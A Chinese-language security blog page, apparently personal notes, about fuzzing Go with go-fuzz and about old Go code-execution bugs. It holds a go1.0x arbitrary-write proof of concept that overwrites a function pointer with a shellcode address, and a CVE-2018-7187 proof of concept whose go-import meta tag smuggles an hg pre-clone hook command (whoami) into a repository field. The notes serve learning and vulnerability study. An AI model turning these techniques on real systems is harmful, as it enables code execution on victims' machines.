@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>关于gofuzz | Hello</title>
+    <meta name="description" content="1">
+    
+    
+    <link rel="preload" href="/assets/css/0.styles.153793e6.css" as="style"><link rel="preload" href="/assets/js/app.fb63a1b9.js" as="script"><link rel="preload" href="/assets/js/30.a0b7fe3b.js" as="script"><link rel="prefetch" href="/assets/js/10.6aae25a8.js"><link rel="prefetch" href="/assets/js/11.e5a6ecb1.js"><link rel="prefetch" href="/assets/js/12.e6734d6c.js"><link rel="prefetch" href="/assets/js/13.c45be31f.js"><link rel="prefetch" href="/assets/js/14.7fe2edb8.js"><link rel="prefetch" href="/assets/js/15.7d96271b.js"><link rel="prefetch" href="/assets/js/16.d5c5556b.js"><link rel="prefetch" href="/assets/js/17.1a634ded.js"><link rel="prefetch" href="/assets/js/18.e6787f4e.js"><link rel="prefetch" href="/assets/js/19.a31276f8.js"><link rel="prefetch" href="/assets/js/2.6cf84733.js"><link rel="prefetch" href="/assets/js/20.f1ebd130.js"><link rel="prefetch" href="/assets/js/21.9fd25a7d.js"><link rel="prefetch" href="/assets/js/22.7ec64c15.js"><link rel="prefetch" href="/assets/js/23.a0a7d0ea.js"><link rel="prefetch" href="/assets/js/24.c17f3010.js"><link rel="prefetch" href="/assets/js/25.9bbf45e5.js"><link rel="prefetch" href="/assets/js/26.4f930016.js"><link rel="prefetch" href="/assets/js/27.b6d66343.js"><link rel="prefetch" href="/assets/js/28.ded43c8f.js"><link rel="prefetch" href="/assets/js/29.35b25580.js"><link rel="prefetch" href="/assets/js/3.88ebc755.js"><link rel="prefetch" href="/assets/js/31.89d75be7.js"><link rel="prefetch" href="/assets/js/32.d7c054e6.js"><link rel="prefetch" href="/assets/js/33.9a5f3e99.js"><link rel="prefetch" href="/assets/js/34.ee5cfb6f.js"><link rel="prefetch" href="/assets/js/35.2054ab64.js"><link rel="prefetch" href="/assets/js/36.73bb48c1.js"><link rel="prefetch" href="/assets/js/37.5a1d6d20.js"><link rel="prefetch" href="/assets/js/38.c7d42097.js"><link rel="prefetch" href="/assets/js/39.fd864930.js"><link rel="prefetch" href="/assets/js/4.dc8e7db2.js"><link rel="prefetch" href="/assets/js/40.6c289e11.js"><link rel="prefetch" href="/assets/js/41.0ed23031.js"><link rel="prefetch" href="/assets/js/42.10b887da.js"><link rel="prefetch" href="/assets/js/43.d348e521.js"><link rel="prefetch" href="/assets/js/44.f98660b8.js"><link rel="prefetch" href="/assets/js/45.a141b3d0.js"><link rel="prefetch" href="/assets/js/46.3a3b1b86.js"><link rel="prefetch" href="/assets/js/47.d2f1996d.js"><link rel="prefetch" href="/assets/js/48.0bd12b2f.js"><link rel="prefetch" href="/assets/js/5.6adfd92b.js"><link rel="prefetch" href="/assets/js/6.f9bcea16.js"><link rel="prefetch" href="/assets/js/7.ad2cffde.js"><link rel="prefetch" href="/assets/js/8.8932bce4.js"><link rel="prefetch" href="/assets/js/9.892cc635.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.153793e6.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="page-main"><div class="component-nav-menu"><div class="placeholder"></div> <div class="search-wrapper"><div aria-haspopup="listbox" role="combobox" aria-owns="el-autocomplete-5113" class="el-autocomplete"><div class="el-input el-input--prefix"><!----><input type="text" autocomplete="off" valueKey="title" placeholder="请输入内容" fetchSuggestions="function () { [native code] }" triggerOnFocus="true" debounce="300" placement="bottom-start" popperAppendToBody="true" background-color="#eee" class="el-input__inner"><span class="el-input__prefix"><i class="el-input__icon el-icon-search"></i></span><!----><!----><!----></div><div role="region" class="el-autocomplete-suggestion el-popper" style="width:;display:none;"><div class="el-scrollbar"><div class="el-autocomplete-suggestion__wrap el-scrollbar__wrap el-scrollbar__wrap--hidden-default"><ul class="el-scrollbar__view el-autocomplete-suggestion__list"></ul></div><div class="el-scrollbar__bar is-horizontal"><div class="el-scrollbar__thumb" style="width:0;transform:translateX(0%);ms-transform:translateX(0%);webkit-transform:translateX(0%);"></div></div><div class="el-scrollbar__bar is-vertical"><div class="el-scrollbar__thumb" style="height:0;transform:translateY(0%);ms-transform:translateY(0%);webkit-transform:translateY(0%);"></div></div></div></div></div></div> <ul role="menubar" class="el-menu--horizontal el-menu" style="background-color:;"><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Home
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item is-active" style="color:;border-bottom-color:;background-color:;">
+        Blog
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        TimeLine
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        Github
+      </li><li role="menuitem" tabindex="-1" class="el-menu-item" style="color:;border-bottom-color:transparent;background-color:;">
+        About
+      </li></ul></div> <div class="page-container"><div class="component-page"><div class="page-content"><!----> <div class="content custom"><h2 id="_0x1-fuzz"><a href="#_0x1-fuzz" aria-hidden="true" class="header-anchor">#</a> 0x1 fuzz</h2> <p>go fuzz 项目 https://github.com/dvyukov/go-fuzz/</p> <p>测试代码</p> <p>fuzz.go</p> <div class="language- extra-class"><pre class="language-text"><code>package test
+
+func Fuzz(data []byte) int {
+	tmp(data)
+	return 0
+}
+</code></pre></div><p>test.go</p> <div class="language- extra-class"><pre class="language-text"><code>package test
+
+import(
+&quot;fmt&quot;
+)
+
+func main(){
+    //var tmpx []byte
+    tmpx := []byte(&quot;0000&quot;)
+    tmp(tmpx)
+}
+
+func tmp(tmp []byte) int{
+    arr1 := tmp
+    if len(arr1) &lt; 5{
+		fmt.Println(&quot;hello world&quot;)
+        return 0
+    }
+    fmt.Println(arr1[100])
+    return 1
+}
+
+</code></pre></div><p>./go-fuzz-build github.com/test</p> <p>./go-fuzz -bin=./test-fuzz.zip -workdir=test</p> <div class="language- extra-class"><pre class="language-text"><code>2018/05/03 21:08:09 workers: 4, corpus: 1 (3s ago), crashers: 1, restarts: 1/0, execs: 0 (0/sec), cover: 0, uptime: 3s
+2018/05/03 21:08:12 workers: 4, corpus: 1 (6s ago), crashers: 1, restarts: 1/0, execs: 0 (0/sec), cover: 90, uptime: 6s
+</code></pre></div><p>cat crashers/6934105ad50010b814c933314b1da6841431bc8b.output</p> <div class="language- extra-class"><pre class="language-text"><code>panic: runtime error: index out of range
+
+goroutine 1 [running]:
+github.com/test.tmp(0x1214000, 0x5, 0x200000, 0x5d232)
+	/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/gopath/src/github.com/test/test.go:19 +0x165
+github.com/test.Fuzz(0x1214000, 0x5, 0x200000, 0xc42003df70)
+	/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/gopath/src/github.com/test/fuzz.go:5 +0x57
+go-fuzz-dep.Main(0x10e3c98)
+	/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/goroot/src/go-fuzz-dep/main.go:49 +0xad
+main.main()
+	/var/folders/xk/jc5ln51j2y91n3kvymwtfwsw0000gn/T/go-fuzz-build211162217/gopath/src/github.com/test/go.fuzz.main/main.go:10 +0x2d
+</code></pre></div><p>测试完gofuzz，由此联想到在golang中是否存在类似c/c++可利用的漏洞，google一下。</p> <p>找到一种在go1.0x中代码执行的办法，已经在go1.1以后的版本修复，暂时记录一波。还有两个2018年golang代码执行。</p> <h2 id="_0x2-arbitrary-write-and-code-execution-in-go1-0x"><a href="#_0x2-arbitrary-write-and-code-execution-in-go1-0x" aria-hidden="true" class="header-anchor">#</a> 0x2 arbitrary write and code execution in go1.0x</h2> <div class="language- extra-class"><pre class="language-text"><code>package main
+
+import &quot;fmt&quot;
+
+// Address to write, computed from a previous run.
+const addr_to_overwrite = 0x50e2f0
+// &amp;shellcode, computed from a previous run.
+const val_to_overwrite uint64 = 0xc200035160
+
+type Embedded struct {
+   offset [addr_to_overwrite]byte
+   payload uint64
+}
+
+type Nested struct {
+  // This magic is necessary is because there is an explict null check if
+  // if the offset is greater than 0x1000.
+  Embedded
+}
+
+type Struct struct {
+ // The issue is that a reference to the embeded struct pointer here
+ // will be offset from null (rather than the true base of the struct).
+ // We thus just make sizeof(the embedded struct) large enough to point
+ // to the address we want to overwrite.
+ //
+ // See https://code.google.com/p/go/issues/detail?id=5336
+ *Nested
+}
+
+var unused = func () {}
+
+func main() {
+ s := &amp;Struct{}
+ shellcode := &quot;\x90\x90\x90\x90\x90\x90\x90\xeb\xfe&quot;
+
+ fmt.Println(&quot;You should overwrite this: &quot;, &amp;unused)
+ fmt.Println(&quot;With this: &quot;, &amp;shellcode)
+
+ fmt.Println(&quot;***********************************************&quot;);
+ fmt.Println(&quot;Overwriting &quot;, &amp;s.payload, &quot; with &quot;, val_to_overwrite)
+
+ *(&amp;s.payload) = val_to_overwrite;
+
+ unused();
+}
+</code></pre></div><h2 id="_0x3-golang-code-exec"><a href="#_0x3-golang-code-exec" aria-hidden="true" class="header-anchor">#</a> 0x3 golang code exec</h2> <p>###1 cve-2018-6574</p> <p>poc: test.go</p> <div class="language- extra-class"><pre class="language-text"><code>package main
+/*
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+void my_print(char *str){
+    printf(&quot;%s\n&quot;,str);
+}
+*/
+import &quot;C&quot;
+import &quot;unsafe&quot;
+import &quot;fmt&quot;
+func main() {
+  fmt.Println(&quot;Hello, World!&quot;)
+  s:=&quot;-----------------------------run by c&quot;
+  cs:=C.CString(s)
+  C.my_print(cs)
+  C.free(unsafe.Pointer(cs))
+}
+</code></pre></div><p>go run test.go</p> <div class="language- extra-class"><pre class="language-text"><code>go run test.go
+Hello, World!
+-----------------------------run by c
+</code></pre></div><p>###2 CVE-2018-7187</p> <p>poc: go-vuln/index.html</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;meta name=&quot;go-import&quot; content=&quot;justfan.com/go-vuln hg --config=hooks.pre-clone=whoami;https://&quot;&gt;
+</code></pre></div><p>fan@fan:~/go$ go get -insecure justfan.com/go-vuln</p> <div class="language- extra-class"><pre class="language-text"><code># cd .; hg clone -U --config=hooks.pre-clone=whoami;https:// /home/fan/go/src/justfan.com/go-vuln
+fan
+/bin/sh: 1: https://: not found
+abort: pre-clone hook exited with status 127
+package justfan.com/go-vuln: exit status 255
+</code></pre></div><p>正常协议</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;meta name=&quot;go-import&quot; content=&quot;justfan.com/go-vuln hg https://www.mercurial-scm.org/repo/hello&quot;&gt;
+</code></pre></div><p>参数</p> <div class="language- extra-class"><pre class="language-text"><code>&gt;-insecure
+
+&gt;&gt;The -insecure flag permits fetching from repositories and resolving
+custom domains using insecure schemes such as HTTP. Use with caution.
+
+&gt;-config=hooks.pre-clone 
+
+&gt;&gt; hg clone --config=hooks.pre-clone=whoami https://www.mercurial-scm.org/repo/hello
+ 
+&gt;&gt;&gt;-pre-command
+&gt;&gt;&gt;&gt;Run before executing the associated command. The contents of the command line are passed as $HG_ARGS. Parsed command line arguments are passed as $HG_PATS and
+$HG_OPTS. These contain string representations of the data internally passed to &lt;command&gt;. $HG_OPTS is a dictionary of options (with unspecified options set to their defaults). $HG_PATS is a list of arguments. If the hook returns failure, the command doesn't execute and Mercurial returns the failure code.
+</code></pre></div></div></div></div></div></div></div>
+    <script src="/assets/js/app.fb63a1b9.js" defer></script><script src="/assets/js/30.a0b7fe3b.js" defer></script>
+  </body>
+</html>
